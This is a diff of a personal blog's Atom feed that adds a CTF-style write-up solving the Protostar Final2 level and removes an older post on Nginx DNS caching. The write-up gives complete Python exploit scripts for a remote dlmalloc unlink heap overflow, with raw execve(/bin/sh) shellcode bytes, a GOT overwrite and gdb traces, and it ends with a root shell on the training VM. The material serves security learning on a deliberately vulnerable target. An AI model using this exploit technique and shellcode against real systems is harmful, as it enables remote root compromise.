@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Programming & Software | David Xia]]></title>
   <link href="https://www.davidxia.com/categories/programming-and-software/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-10-30T23:52:49-04:00</updated>
+  <updated>2020-11-01T18:15:41-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,619 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
+    <link href="https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level/"/>
+    <updated>2020-11-01T17:46:32-05:00</updated>
+    <id>https://www.davidxia.com/2020/11/my-solution-to-exploit-exercises-protostar-final2-level</id>
+    <content type="html"><![CDATA[<p>This is an explanation of <a href="https://exploit-exercises.lains.space/protostar/final2/">Protostar level Final2</a>. I wrote a solution in April without an
+explanation. I read it last night and had to spend half a day to understand it again. So next time
+I&rsquo;ll write the explanation while it&rsquo;s still fresh in my head.</p>
+
+<p>The level&rsquo;s description is</p>
+
+<p>{% blockquote %}
+Remote heap level :)
+Core files will be in /tmp.
+This level is at /opt/protostar/bin/final2
+{% endblockquote %}</p>
+
+<!-- more -->
+
+
+<p>This is the source code.</p>
+
+<pre><code class="c">#include "../common/common.c"
+#include "../common/malloc.c"
+
+#define NAME "final2"
+#define UID 0
+#define GID 0
+#define PORT 2993
+
+#define REQSZ 128
+
+void check_path(char *buf)
+{
+  char *start;
+  char *p;
+  int l;
+
+  /*
+  * Work out old software bug
+  */
+
+  p = rindex(buf, '/');
+  l = strlen(p);
+  if(p) {
+      start = strstr(buf, "ROOT");
+      if(start) {
+          while(*start != '/') start--;
+          memmove(start, p, l);
+          printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start &lt; buf ?
+          "yes" : "no", start - buf);
+      }
+  }
+}
+
+int get_requests(int fd)
+{
+  char *buf;
+  char *destroylist[256];
+  int dll;
+  int i;
+
+  dll = 0;
+  while(1) {
+      if(dll &gt;= 255) break;
+
+      buf = calloc(REQSZ, 1);
+      destroylist[dll] = buf; /* Line is missing in original source. gdb disassemble will show it. */
+      if(read(fd, buf, REQSZ) != REQSZ) break;
+
+      if(strncmp(buf, "FSRD", 4) != 0) break;
+
+      check_path(buf + 4);     
+
+      dll++;
+  }
+
+  for(i = 0; i &lt; dll; i++) {
+                write(fd, "Process OK\n", strlen("Process OK\n"));
+      free(destroylist[i]);
+  }
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  get_requests(fd);
+
+}
+</code></pre>
+
+<h2>Overview of source code</h2>
+
+<p>The first line of the description coupled with the fact the code listens on port 2993 means we&rsquo;ll
+have to send a TCP packet that exploits a heap related vulnerability. <code>main()</code> is pretty simple. It
+runs the final2 binary in the background as root and processes requests with <code>get_requests()</code>.
+<code>get_requests()</code> declares an array of 256 char pointers and reads input strings into it. If any
+request size isn&rsquo;t <code>REQSZ</code> or 128 bytes, the function breaks out of the <code>while(1)</code> loop. Any request
+payload that doesn&rsquo;t start with <code>FSRD</code> also breaks out of the loop. The <code>check_path()</code> function is
+then called and <code>dll</code> is incremented. A for-loop writes &ldquo;Process OK&rdquo; to stdout and frees each string
+buffer starting with the oldest.</p>
+
+<p><code>check_path()</code> stores a pointer to <code>buf</code>&rsquo;s right-most <code>/</code> in <code>p</code>. <code>l</code> is the length of the string
+starting from <code>p</code>. If <code>p</code> is greater than 0, <code>start</code> points to the part of <code>buf</code> that has <code>"ROOT"</code>.
+If <code>"ROOT"</code> is a substring in <code>buf</code>, the while loop decrements <code>start</code> until it finds a <code>/</code>. Then
+<code>memmove()</code> moves <code>l</code> bytes of the string starting at <code>p</code> to <code>start</code>.</p>
+
+<p>A TCP packet with the string <code>FSRD/ROOT/AAAA</code> will cause <code>p</code> to point to the second <code>/</code>. So <code>p</code> as a
+string is <code>/AAAA</code>. <code>l</code> is 5. <code>start</code> initially points to the <code>R</code> in <code>ROOT</code> and later is decremented
+to point to the first <code>/</code>. <code>memmove()</code> changes the string to <code>FSRD/AAAA/AAAA</code>.</p>
+
+<p>Notice that <code>start--</code> doesn&rsquo;t check the bounds of the string passed in by <code>buf</code>. It will keep
+scanning leftward until it finds some <code>/</code>. So <code>memmove()</code> can write to memory outside of the current
+string.</p>
+
+<h2>General Exploit Strategy</h2>
+
+<p>We know we&rsquo;ll need to exploit the <code>free()</code> call which in this series of exercises uses the
+vulnerable dlmalloc <code>unlink()</code> macro. In a <a href="/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a>, I showed how this exploit
+manipulates heap memory to redirect code execution. We&rsquo;ll need to inject <a href="https://en.wikipedia.org/wiki/Shellcode">shellcode</a> via the request
+payloads. Our request payloads also need to corrupt heap memory in a way that will trick dlmalloc
+into redirecting code to the shellcode.</p>
+
+<h2>Exploiting <code>memmove()</code></h2>
+
+<p>Let&rsquo;s craft a first payload that will allow the second payload to overwrite heap memory before the
+start of the second string. <code>FSRDAAAA...AAAA/AAAA</code> should work. The second payload can be
+<code>FSRDROOTAAA...AAAA/BBBB</code>. After the second call to <code>check_path()</code>, the heap memory of the first
+string should be <code>FSRDAAAA...AAAA/BBBB</code>. Let&rsquo;s confirm this with a Python script and <code>gdb</code>. We&rsquo;ll
+set a breakpoint right after the call to <code>check_path()</code> and send these two strings.</p>
+
+<p>We save the following contents to a file named <code>test.py</code>.</p>
+
+<pre><code class="python">#!/usr/bin/env python
+
+import socket
+import sys
+
+HOST = sys.argv[1]
+PORT = 2993
+REQSZ = 128
+
+# Establish TCP connection
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+payload1 = 'FSRD' + 'A' * (REQSZ - 4 - 5) + '/' + 'AAAA'  # 'FSRDAAAA.../AAAA'
+s.sendall(bytes(payload1, 'ascii'))
+
+payload2 = 'FSRD' + 'ROOT' + 'A' * (REQSZ - 8 - 5) + '/' + 'BBBB'  # 'FSRDROOTAAAA.../BBBB'
+s.sendall(bytes(payload2, 'ascii'))
+
+# Terminate session by sending a payload that causes get_requests() to return
+s.sendall(bytes('AAAA', 'ascii'))
+
+data = s.recv(1024)
+print(data.decode('ascii'))  # print the confirmation
+
+s.close()
+</code></pre>
+
+<p>I&rsquo;m running the Protostar VM on Virtualbox on a Macbook. Set the network settings for the VM to
+Host-only Adapter. Once the VM starts, use the Virtualbox &ldquo;Show&rdquo; button to get a terminal to the VM.
+Login as <code>user</code> with password <code>user</code>. Run <code>ip addr show</code> to find the VM&rsquo;s local IP address. Mine is
+<code>192.168.99.107</code>. I then close the Virtualbox terminal because I like to use iTerm. I SSH with iTerm
+into the VM as root with password <code>godmode</code>. We need to be root in order to attach gdb to a running
+process.</p>
+
+<pre><code>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.99.107
+</code></pre>
+
+<p>You can see final2 is already running. We get the PID.</p>
+
+<pre><code>root@protostar:/# ps aux | grep final2
+root      1495  0.0  0.2   1544   284 ?        Ss   10:44   0:00 /opt/protostar/bin/final2
+</code></pre>
+
+<p>Now attach gdb to it. Since the program forks a new child process to handle requests, we <code>set follow-fork-mode child</code> to make gdb follow the child process instead of the parent. <code>set detach-on-fork off</code> makes gdb hold control of both parent and child (I&rsquo;m not sure if this is necessary). The other two gdb settings are my personal preferences.</p>
+
+<pre><code>root@protostar:/# gdb /opt/protostar/bin/final2 -p 1495
+
+GNU gdb (GDB) 7.0.1-debian
+Copyright (C) 2009 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu".
+For bug reporting instructions, please see:
+&lt;http://www.gnu.org/software/gdb/bugs/&gt;...
+Reading symbols from /opt/protostar/bin/final2...done.
+Attaching to program: /opt/protostar/bin/final2, process 1495
+Reading symbols from /lib/libc.so.6...Reading symbols from /usr/lib/debug/lib/libc-2.11.2.so...done.
+(no debugging symbols found)...done.
+Loaded symbols for /lib/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug/lib/ld-2.11.2.so...done.
+(no debugging symbols found)...done.
+Loaded symbols for /lib/ld-linux.so.2
+accept () at ../sysdeps/unix/sysv/linux/i386/socket.S:64
+64  ../sysdeps/unix/sysv/linux/i386/socket.S: No such file or directory.
+    in ../sysdeps/unix/sysv/linux/i386/socket.S
+
+(gdb) set follow-fork-mode child
+(gdb) set detach-on-fork off
+(gdb) set disassembly-flavor intel
+(gdb) set pagination off
+</code></pre>
+
+<p>Disassemble <code>get_requests()</code> to find where <code>check_path()</code> returns.</p>
+
+<pre><code>(gdb) disassemble get_requests
+Dump of assembler code for function get_requests:
+0x0804bd47 &lt;get_requests+0&gt;:    push   ebp
+0x0804bd48 &lt;get_requests+1&gt;:    mov    ebp,esp
+...
+0x0804bdce &lt;get_requests+135&gt;:  mov    DWORD PTR [esp],eax
+0x0804bdd1 &lt;get_requests+138&gt;:  call   0x804bcd0 &lt;check_path&gt;
+0x0804bdd6 &lt;get_requests+143&gt;:  jmp    0x804bd57 &lt;get_requests+16&gt;
+0x0804bddb &lt;get_requests+148&gt;:  nop
+...
+0x0804be25 &lt;get_requests+222&gt;:  ret
+End of assembler dump.
+
+(gdb) break *get_requests+143
+Breakpoint 1 at 0x804bdd6: file final2/final2.c, line 51.
+(gdb) c
+Continuing.
+</code></pre>
+
+<p>Now run our Python script in another terminal to send the strings.</p>
+
+<pre><code>python test.py 192.168.99.107
+</code></pre>
+
+<p>Our gdb terminal will show the following.</p>
+
+<pre><code>[New process 2322]
+[Switching to process 2322]
+
+Breakpoint 1, get_requests (fd=4) at final2/final2.c:51
+51  final2/final2.c: No such file or directory.
+    in final2/final2.c
+Current language:  auto
+The current source language is "auto; currently c".
+</code></pre>
+
+<p>Print <code>buf</code> to show the address it points to. Then examine the first 40 DWORDs in hexadecimal
+starting at address <code>0x804e000</code> (<code>0x804e008 - 0x8</code> so we can see the first heap chunk&rsquo;s metadata in
+the previous 8 bytes). We can see its <code>FSRD</code> (<code>0x44525346</code>) followed by lots of <code>A</code>s (<code>0x41</code>s) and
+ends in <code>/AAAA</code>.</p>
+
+<pre><code>(gdb) p buf
+$1 = 0x804e008 "FSRD", 'A' &lt;repeats 119 times&gt;, "/AAAA"
+
+(gdb) x/40wx 0x804e000
+0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
+0x804e010:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e080:  0x2f414141  0x41414141  0x00000000  0x00000f79
+0x804e090:  0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>We continue and examine the memory of the first chunk again. We expect the memory at address
+<code>0x804e084</code> to be <code>BBBB</code> or <code>0x42424242</code> which it is.</p>
+
+<pre><code>(gdb) c
+Continuing.
+
+Breakpoint 1, get_requests (fd=4) at final2/final2.c:51
+51  in final2/final2.c
+
+(gdb) x/40wx 0x804e000
+0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
+0x804e010:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e080:  0x2f414141  0x42424242  0x00000000  0x00000089
+0x804e090:  0x44525346  0x544f4f52  0x41414141  0x41414141
+</code></pre>
+
+<h2>Exploiting <code>free()</code></h2>
+
+<p>With the ability to overwrite bytes following a strategically placed <code>/</code> character in the previous
+heap chunk, we can perform a classic heap overflow exploit using the <code>unlink()</code> technique. We can&rsquo;t
+overwrite the first chunk&rsquo;s heap metadata because there&rsquo;s no way to insert a <code>/</code> before it. So we
+target the second chunk&rsquo;s heap metadata. I&rsquo;m now going to rehash some of the dlmalloc algorithm
+explained in my <a href="/2020/04/how-to-exploit-dlmalloc-unlink/?asdf">previous post</a> because it can be a little confusing.</p>
+
+<p>When the first chunk is freed, <code>unlink()</code> will run on the second chunk if the second chunk has
+already been freed. dlmalloc determines if the second chunk is freed by checking the third chunk&rsquo;s
+<code>PREV_INUSE</code> bit which is the lowest bit of the second byte of the chunk. In order to find the start
+of the third chunk, dlmalloc adds the value of the chunk&rsquo;s second DWORD bitmasked with 0x1 (i.e.
+ignoring the lowest bit) to the chunk&rsquo;s starting address. So in the above memory dump, the
+start of the second chunk is <code>0x00000089 &amp;0x1 + 0x804e000 = 0x804e088</code>. Likewise, the start of the
+third chunk is <code>0x00000089 &amp;0x1 + 0x804e088 = 0x804e110</code>. So we have to figure out a way to write
+arbitrary bytes to the third chunk.</p>
+
+<p>But we&rsquo;re already writing arbitrary bytes to the second chunk&rsquo;s metadata. Is there way to make
+dlmalloc think the third chunk starts somewhere in memory where we&rsquo;re already writing bytes for the
+second chunk? Nothing in dlmalloc checks the third chunk is actually right after the second.
+dlmalloc just blindly performs an addition on two numbers. One of these numbers is the second
+chunk&rsquo;s size which we can set via the <code>memmove()</code> bug. Let&rsquo;s make dlmalloc think the third chunk is
+actually four bytes before the start of the second chunk. The second chunk is at <code>0x804e088</code> so the
+&ldquo;virtual&rdquo; third chunk will be at <code>0x804e084</code>. What number added to <code>0x804e088</code> equals <code>0x804e084</code>?
+-4. [Integer overflow] means adding <code>0xfffffffc</code> is the same as adding -4 (<code>0x804e088 + 0xfffffffc =
+0x804e084</code>). So the second chunk&rsquo;s second DWORD representing its size must be <code>0xfffffffc</code>, and the
+<code>PREV_INUSE</code> bit of the third chunk must be 0. <code>0xfffffffc 0xfffffffc</code> will work.</p>
+
+<p>Once we fool dlmalloc into thinking the second chunk is already freed, dlmalloc will <code>unlink()</code> it.
+So we need to craft values for the second chunk&rsquo;s forwards and backwards pointers such that
+<code>unlink()</code> will redirect code execution to another region of memory where we can insert shellcode.</p>
+
+<p>In the Heap3 level we overwrote the address of a function in the procedure linkage table (PLT) with
+the address of shellcode. We can do the same here. Since we send two packets, <code>dll</code> will be 2. The
+for-loop will call <code>write()</code> twice. The first <code>free()</code> will overwrite <code>write()</code>&rsquo;s address in the
+PLT. Let&rsquo;s find the PLT address containing the address of <code>write()</code>. We <code>disassemble get_requests</code>,
+examine the address <code>0x8048dfc</code> as an instruction to get the address in the global offset table
+(GOT) that points to the dynamically linked library containing the actual <code>write()0</code> function. We
+want to overwrite the contents of <code>0x804d41c</code> with the address of our shellcode. Since <code>unlink()</code>
+adds 12 to the forwards pointer, we need to make the forward pointer <code>0x804d41c - 12</code>.</p>
+
+<pre><code>disassemble get_requests
+
+Dump of assembler code for function get_requests:
+...
+0x0804be01 &lt;get_requests+186&gt;:  call   0x8048dfc &lt;write@plt&gt;
+...
+End of assembler dump.
+
+(gdb) x/i 0x8048dfc
+0x8048dfc &lt;write@plt&gt;:  jmp    DWORD PTR ds:0x804d41c
+
+(gdb) x/x 0x804d41c
+0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0xb7f53c70
+</code></pre>
+
+<h2>Crafting Malicious Packets</h2>
+
+<p>Where should we put our shellcode? We can include it in our first request. The first two DWORDs will
+be clobbered by dlmalloc when it sets the first chunk&rsquo;s forwards and backwards pointers. The first
+word needs to be used for <code>FSRD</code> anyways. So let&rsquo;s put shellcode at <code>0x804e010</code>. This address will
+be our backwards pointer.</p>
+
+<p>To summarize, this is how the packets should look so far.</p>
+
+<p>The first payload must start with <code>FSRD</code>. Then we need four bytes of filler bytes <code>AAAA</code> followed by
+shellcode (TBD). The last byte must be <code>/</code> for <code>memmove()</code>. The payload must be 128 bytes. The
+spaces in the payload visualization below are just for readability. They shouldn&rsquo;t be in the actual
+payload.</p>
+
+<pre><code>FSRD AAAA &lt;shellcode&gt; AAAA ... AAA/
+</code></pre>
+
+<p>The second payload must start with <code>FSRDROOT</code>. Then have <code>0xfffffffc 0xfffffffc</code>. Then the forward
+pointer <code>0x804d41c - 12</code> and backward pointer <code>0x804e010</code>. The whole payload must again be 128
+bytes. We can just fill with <code>A</code>s.</p>
+
+<pre><code>FSRD ROOT 0xfffffffc 0xfffffffc 0x804d41c - 12 0x804e010 AAAA ... AAAA
+</code></pre>
+
+<p>Before we craft shellcode, let&rsquo;s confirm the exploit will redirect code execution to the proposed
+shellcode address. Instead of using actual shellcode, we&rsquo;ll use four bytes of <code>0xcc</code> which is a
+one-byte x86 instruction called <a href="https://en.wikipedia.org/wiki/INT_(x86_instruction)"><code>INT3</code></a> that causes the processor to halt the process for any
+attached debuggers. If we hit this opcode, our attached gdb debugger receive the <code>SIGTRAP</code> signal.
+Let&rsquo;s test with the below Python script.</p>
+
+<pre><code class="python">import socket
+import struct
+import sys
+import telnetlib
+
+
+REQSZ = 128
+HOST = sys.argv[1]
+PORT = 2993
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+shellcode = b'\xcc\xcc\xcc\xcc'
+
+
+ba = bytearray(bytes('FSRDAAAA', 'ascii'))
+ba.extend(shellcode)
+ba = ba.ljust(REQSZ, b'\x41')
+ba[-1] = ord('/')
+s.sendall(ba)
+
+ba = bytearray(bytes('FSRDROOT/', 'ascii'))
+# Use integer overflow to make dlmalloc think third chunk is 4 bytes before second chunk.
+ba.extend(struct.pack('I', 0xfffffffc) + struct.pack('I', 0xfffffffc))
+# Add forward and backward pointers
+ba.extend(struct.pack('I', 0x804d41c - 12) + struct.pack('I', 0x804e010))
+ba = ba.ljust(REQSZ, b'\x41')
+s.sendall(ba)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>Attach gdb to the <code>final2</code> process again.</p>
+
+<pre><code>ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" root@192.168.99.107
+
+root@protostar:/# gdb /opt/protostar/bin/final2 -p 1495
+...
+
+(gdb) set follow-fork-mode child
+Current language:  auto
+The current source language is "auto; currently asm".
+(gdb) set detach-on-fork off
+(gdb) set disassembly-flavor intel
+(gdb) set pagination off
+</code></pre>
+
+<p>Set a breakpoint at the call to <code>write()</code>.</p>
+
+<pre><code>(gdb) break *get_requests+186
+Breakpoint 1 at 0x804be01: file final2/final2.c, line 54.
+(gdb) c
+Continuing.
+</code></pre>
+
+<p>Run the Python script in another terminal. Hit enter to send a third packet that&rsquo;s less than 128
+bytes to break out of the <code>while(1)</code> loop.</p>
+
+<pre><code>python final2.py 192.168.99.107
+&lt;enter&gt;
+Process OK
+</code></pre>
+
+<p>The gdb session should hit the breakpoint at <code>write()</code>.</p>
+
+<pre><code>[New process 2622]
+[Switching to process 2622]
+
+Breakpoint 1, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
+54  final2/final2.c: No such file or directory.
+    in final2/final2.c
+Current language:  auto
+The current source language is "auto; currently c".
+</code></pre>
+
+<p>Examine the first 80 DWORDs. Continue and examine again.</p>
+
+<pre><code>(gdb) x/80wx 0x804e000
+0x804e000:  0x00000000  0x00000089  0x44525346  0x41414141
+0x804e010:  0xcccccccc  0x41414141  0x41414141  0x41414141
+0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e080:  0x41414141  0x2f414141  0xfffffffc  0xfffffffc
+0x804e090:  0x0804d410  0x0804e014  0x41414141  0x41414141
+0x804e0a0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0b0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0c0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0d0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0e0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0f0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e100:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e110:  0x00000000  0x00000089  0x0000000a  0x00000000
+0x804e120:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804e130:  0x00000000  0x00000000  0x00000000  0x00000000
+
+(gdb) c
+Continuing.
+Breakpoint 1, 0x0804be01 in get_requests (fd=4) at final2/final2.c:54
+54  in final2/final2.c
+
+(gdb) x/80wx 0x804e000
+0x804e000:  0x00000000  0x00000085  0x0804d534  0x0804d534
+0x804e010:  0xcccccccc  0x41414141  0x0804d410  0x41414141
+0x804e020:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e030:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e040:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e050:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e060:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e070:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e080:  0x41414141  0x00000084  0xfffffffc  0xfffffffc
+0x804e090:  0x0804d410  0x0804e014  0x41414141  0x41414141
+0x804e0a0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0b0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0c0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0d0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0e0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e0f0:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e100:  0x41414141  0x41414141  0x41414141  0x41414141
+0x804e110:  0x00000000  0x00000089  0x0000000a  0x00000000
+0x804e120:  0x00000000  0x00000000  0x00000000  0x00000000
+0x804e130:  0x00000000  0x00000000  0x00000000  0x00000000
+</code></pre>
+
+<p>Memory at <code>0x804e008</code> and <code>0x804e00c</code> have been changed (to addresses before the heap. I guess
+because it&rsquo;s some special value for the first chunk). Our INT3 instruction is at <code>0x804e010</code>. Let&rsquo;s
+look at the GOT entry for <code>write()</code>.</p>
+
+<pre><code>(gdb) x/i 0x8048dfc
+0x8048dfc &lt;write@plt&gt;:  jmp    DWORD PTR ds:0x804d41c
+
+(gdb) x/x 0x804d41c
+0x804d41c &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804e014
+</code></pre>
+
+<p>Its value is the location of our INT3. This means the next call to <code>write()</code> will redirect code
+execution to our INT3 which should cause gdb to break again.</p>
+
+<pre><code>(gdb) c
+Continuing.
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x0804e011 in ?? ()
+</code></pre>
+
+<p>It worked!</p>
+
+<h2>Crafting the Shellcode</h2>
+
+<p>So now all we have to is insert some real shellcode that&rsquo;ll own the system. Since final2 is running
+as <code>root</code>, let&rsquo;s make the process start a shell. This will allow us send arbitrary commands over TCP
+that get executed as root, i.e. remote code execution. <a href="http://shell-storm.org/shellcode/">Shellstorm</a> has a great library of
+shellcodes. Let&rsquo;s use <a href="http://shell-storm.org/shellcode/files/shellcode-811.php">&ldquo;Linux/x86 - execve(/bin/sh) - 28 bytes&rdquo;</a>. But we have a
+problem. <code>unlink()</code> overwrites the memory at <code>0x804e018</code> (it&rsquo;ll always overwrite four bytes of
+memory eight bytes ahead of whatever address we pick), and no useful shellcode is short enough to
+fit into eight bytes. What can we do?</p>
+
+<p>If the shellcode could only jump past <code>0x804e018</code> to <code>0x804e01c</code> where we have a huge piece of
+contiguous memory. Luckily the <code>jmp</code> instruction (<code>\xeb</code>) does exactly this. Its argument is how many
+bytes to jump over. So our shellcode can start with <code>0xeb 0x0a</code> which moves the instruction pointer
+10 bytes forward. We fill in the middle 10 bytes with <a href="https://www.aldeid.com/wiki/X86-assembly/Instructions/nop"><code>nop</code></a>s (<code>0x90</code>). Our final script will
+be this.</p>
+
+<pre><code>import socket
+import struct
+import sys
+import telnetlib
+
+
+REQSZ = 128
+HOST = sys.argv[1]
+PORT = 2993
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+# Two bytes for "jmp 0x0c", two bytes of nop padding to fill out the word,
+# eight more nop bytes (second nop DWORD will be clobbered by unlink()),
+# then actual shellcode from http://shell-storm.org/shellcode/files/shellcode-811.php
+shellcode = b'\xeb\x0a\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' \
+            b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69' \
+            b'\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31' \
+            b'\xc0\x40\xcd\x80'
+
+# These eight bytes will be overwritten by unlink().
+ba = bytearray(bytes('FSRDAAAA', 'ascii'))
+ba.extend(shellcode)
+ba = ba.ljust(REQSZ, b'\x41')
+# Set the last byte to a '/' for memmove().
+ba[-1] = ord('/')
+s.sendall(ba)
+
+ba = bytearray(bytes('FSRDROOT/', 'ascii'))
+# Use integer overflow to make dlmalloc think third chunk is four bytes before second chunk.
+ba.extend(struct.pack('I', 0xfffffffc) + struct.pack('I', 0xfffffffc))
+# Add forward and backward pointers
+ba.extend(struct.pack('I', 0x804d41c - 12) + struct.pack('I', 0x804e010))
+ba = ba.ljust(REQSZ, b'\x41')
+s.sendall(ba)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<pre><code>python final2.py 192.168.99.107
+
+Process OK
+whoami
+root
+</code></pre>
+
+<h3>References</h3>
+
+<ul>
+<li><a href="https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387">https://medium.com/@iphelix/exploit-exercises-protostar-final-levels-72875b0c3387</a></li>
+</ul>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[How to Analyze Mobile App Traffic and Reverse Engineer Its Non-Public API]]></title>
@@ -1845,255 +2458,6 @@ starts to fail around 150RPS. When it does fail, p99 latency skyrockets from les
 
 <p>How have you tried load testing WI or other GKE features? What&rsquo;re your favorite load testing tools
 for these cases, and what interesting behavior have you found?</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[More About Nginx DNS Resolution Than You Ever Wanted to Know]]></title>
-    <link href="https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know/"/>
-    <updated>2019-05-17T12:58:38-04:00</updated>
-    <id>https://www.davidxia.com/2019/05/more-about-nginx-dns-resolution-than-you-ever-wanted-to-know</id>
-    <content type="html"><![CDATA[<p>This is a post about Nginx&rsquo;s DNS resolution behavior I didn&rsquo;t know about but wish I did before I
-started using Kubernetes (K8s).</p>
-
-<h2>Nginx caches statically configured domains once</h2>
-
-<h3>Symptoms</h3>
-
-<p>I moved a backend service <code>foo</code> from running on a virtual machine to K8s. Foo&rsquo;s clients include an
-Nginx instance running outside K8s configured with this <code>upstream</code> block.</p>
-
-<pre><code>upstream foo {
-  server foo.example.com.;
-}
-
-server {
-  ...
-
-  location ~* /_foo/(.*) {
-    proxy_pass https://foo/$1;
-    ...
-  }
-}
-</code></pre>
-
-<p>K8s Pods can be rescheduled anytime so their IPs aren&rsquo;t stable. I&rsquo;m supposed to use K8s Services
-to avoid caching these ephemeral Pod IPs. But in my case because of interoperability reasons I was
-registering Pod IPs directly as A records for <code>foo.example.com.</code>. I started noticing that after my Pod
-IPs changed either because of rescheduling or updating the Deployment, Nginx started throwing
-<code>502 Bad Gateway</code> errors.</p>
-
-<h3>Root Problem</h3>
-
-<p>Nginx resolves statically configured domain names only once at startup or configuration
-reload time. So Nginx resolved <code>foo.example.com.</code> once at startup to several Pod IPs and cached
-them forever.</p>
-
-<h3>Solution</h3>
-
-<!-- more -->
-
-
-<p>Using a variable for the domain name will make Nginx resolve and cache it using the TTL value of the
-DNS response. So replace the <code>upstream</code> block with a variable. I have no idea why it has to be a
-variable to make Nginx resolve the domain periodically.</p>
-
-<pre><code>set $foo_url foo.example.com.;
-</code></pre>
-
-<p>And replace the <code>proxy_pass</code> line with</p>
-
-<pre><code>  location ~* /_foo/(.*) {
-    proxy_pass https://$foo_url/$1;
-    ...
-  }
-</code></pre>
-
-<p>This behavior isn&rsquo;t documented but has been observed empirically and discussed <a href="https://serverfault.com/a/593003/88755">here</a>, <a href="https://stackoverflow.com/a/41476524/553994">here</a>,
-and <a href="https://www.ruby-forum.com/t/using-127-0-0-1-in-resolver/238180/4">here</a>. I also learned that this setup requires me to define a <code>resolver</code> in the Nginx configs.
-<strong>For some reason Nginx resolves statically configured domains by querying the nameserver specified in
-<code>/etc/resolv.conf</code> but periodically resolved domains require a completely different config
-setting.</strong> I would love to know why.</p>
-
-<p>The VM on which Nginx was running ran a Bind DNS server locally, so I set <code>resolver 127.0.0.1</code>.
-I triggered the code path that made Nginx send requests to foo and saw periodic DNS queries
